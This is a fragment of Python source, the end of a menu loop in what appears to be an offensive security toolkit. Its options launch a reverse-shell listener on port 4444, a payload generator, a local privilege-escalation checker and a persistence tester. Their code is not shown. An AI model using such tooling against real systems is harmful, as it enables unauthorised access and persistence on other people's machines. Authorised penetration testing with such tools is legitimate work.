                url = re.search(r'(?:https?://)?[^\s]+', cmd).group()
                await AdvancedScraper().scrape_url(url)
            else:
                console.print("[red]Please use the dedicated menu options.[/red]")
        elif c == "22":
            break
        elif c == "23":
            port = int(input("Port to listen on: ").strip() or 4444)
            rs = ReverseShellHandler()
            await rs.start(port)
        elif c == "24":
            pg = PayloadGenerator()
            await pg.interactive()
        elif c == "25":
            pe = LocalPrivEscChecker()
            await pe.run()
        elif c == "26":
            pt = PersistenceTester()
            await pt.interactive()
        else:
            console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    asyncio.run(main())
